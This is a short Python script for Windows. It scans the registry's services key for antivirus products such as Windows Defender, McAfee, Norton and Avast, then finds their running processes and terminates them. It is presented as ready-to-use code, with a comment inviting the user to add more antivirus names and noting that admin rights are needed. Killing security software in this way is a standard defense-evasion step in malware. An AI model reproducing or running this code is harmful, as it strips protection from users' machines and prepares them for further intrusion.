# Disabling Autorun for an antivirus process only ensures that it will not be run automatically on system boot or user login
import psutil, os, signal, winreg, signal
from time import sleep

# Add your antivirus' system name to this list 
av_list = ["MBAM", "McAfee", "Symantec", "Avast", "WinDefend", "AVG", "Norton"]

# Detect Antivirus using AV list
reghive = winreg.HKEY_LOCAL_MACHINE
regpath = r"SYSTEM\CurrentControlSet\Services"
try: 
    key = winreg.OpenKey(reghive, regpath, 0, access=winreg.KEY_READ)
    numKeys = winreg.QueryInfoKey(key)[0]
    for i in range(numKeys):
        subkey = winreg.EnumKey(key, i)
        for name in av_list:
            if name in subkey: 
                subPath = "%s\\%s" % (regpath,subkey)
                k = winreg.OpenKey(reghive,subPath,0,winreg.KEY_READ)
                numVals = winreg.QueryInfoKey(k)[1]
                for j in range(numVals):
                    val = winreg.EnumValue(k,j)
                    if val[0] == "Start" and val[1] == 2:
                        print("Service %s set to run automatically"
                              % subkey) 
                        #Terminate AV (need admin permissions) by finding and killing process
                        for process in psutil.process_iter():
                            if name in process.name():
                                os.kill(process.pid, signal.SIGTERM)
except Exception as e:
    print(e)


